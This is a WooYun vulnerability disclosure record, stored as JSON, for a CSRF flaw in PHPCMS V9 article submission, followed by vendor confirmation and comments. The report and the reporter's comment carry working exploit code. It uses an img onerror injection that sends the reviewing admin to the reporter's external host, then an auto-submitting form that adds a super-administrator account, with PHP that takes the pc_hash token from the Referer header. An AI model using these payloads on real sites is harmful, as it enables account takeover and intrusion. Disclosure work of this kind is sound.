{"id": 13556, "wybug_id": "wooyun-2013-019157", "wybug_title": "PHPCMS V9 文章投稿CSRF漏洞", "wybug_corp": "phpcms", "wybug_author": "tenzy", "wybug_date": "2013-02-25 11:31", "wybug_open_date": "2013-04-11 11:32", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-02-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-03-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-03-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-11：\t细节向公众公开  简要描述： CSRF导致可以添加后台管理员帐号。 详细说明：  \n\n在会员中心，文章投稿时，在来源填入：\n<img src=\"a\" onerror=\"location.href='http://tenzy.cn/0day/phpcms_v9_csrf_add_admin.php'\">\n漏洞利用代码：\n<form name=\"myform\" action=\"index.php?m=admin&c=admin_manage&a=add&pc_hash=\" method=\"post\" id=\"myform\"><input type=\"text\" name=\"info[username]\"  class=\"input-text\" id=\"username\" value=\"tenzy\" ></input><input type=\"password\" name=\"info[password]\" class=\"input-text\" id=\"password\" value=\"123456\"></input><input type=\"password\" name=\"info[pwdconfirm]\" class=\"input-text\" id=\"pwdconfirm\" value=\"123456\"></input><input type=\"text\" name=\"info[email]\" value=\"tenzy@live.cn\" class=\"input-text\" id=\"email\" size=\"30\" ></input><input type=\"text\" name=\"info[realname]\" value=\"tenzy\" class=\"input-text\" id=\"realname\"></input><select name=\"info[roleid]\"><option value=\"1\" >超级管理员</option></select>    <input name=\"dosubmit\" type=\"text\" value=\"yes\" ></form><script>myform.submit()</script>\n如果管理员在后台审核，就会触发JS，导致添加管理员。。\n\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  one of BUGS~~~   版权声明：转载请注明来源 tenzy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-02-25 13:46 厂商回复： 非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-02-25 11:37 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  漏洞利用代码那里是@xsser自己去看http://tenzy.cn/0day/phpcms_v9_csrf_add_admin.php代码然后编辑发出来的。。。看到的内容完整。。我的phpcms_v9_csrf_add_admin.php文件会抓referer然后取来路里的pc_hash和来源网站的URL，放到表单的action里的。。。否则这个表单一提交就跳到我的网站根目录了    \n     2013-02-25 11:38 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  接上文：看到的内容完整 ->  看到的内容不完整。。    \n     2013-02-25 11:40 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  <?php$url = explode(\"index.php\", $_SERVER[\"HTTP_REFERER\"]);$pc_hash = explode(\"pc_hash=\", $_SERVER[\"HTTP_REFERER\"]);$pc_hash = $pc_hash[1];?><form name=\"myform\" action=\"<?php echo $url[0];?>index.php?m=admin&c=admin_manage&a=add&pc_hash=<?php echo $pc_hash;?>\" method=\"post\" id=\"myform\"><input type=\"text\" name=\"info[username]\"  class=\"input-text\" id=\"username\" value=\"tenzy\" ></input><input type=\"password\" name=\"info[password]\" class=\"input-text\" id=\"password\" value=\"123456\"></input><input type=\"password\" name=\"info[pwdconfirm]\" class=\"input-text\" id=\"pwdconfirm\" value=\"123456\"></input><input type=\"text\" name=\"info[email]\" value=\"tenzy@live.cn\" class=\"input-text\" id=\"email\" size=\"30\" ></input><input type=\"text\" name=\"info[realname]\" value=\"tenzy\" class=\"input-text\" id=\"realname\"></input><select name=\"info[roleid]\"><option value=\"1\" >超级管理员</option></select>    <input name=\"dosubmit\" type=\"text\" value=\"yes\" ></form><script>myform.submit()</script>    \n     2013-02-25 12:12 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  哇哇...元宵之后的第一发耶    \n     2013-03-27 16:45 |    \t\t白胡子 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:3        )\t\t \n  看标题就感觉到是洞主了，果不其然    \n     2013-05-18 22:32 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  phpcms合辑..~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}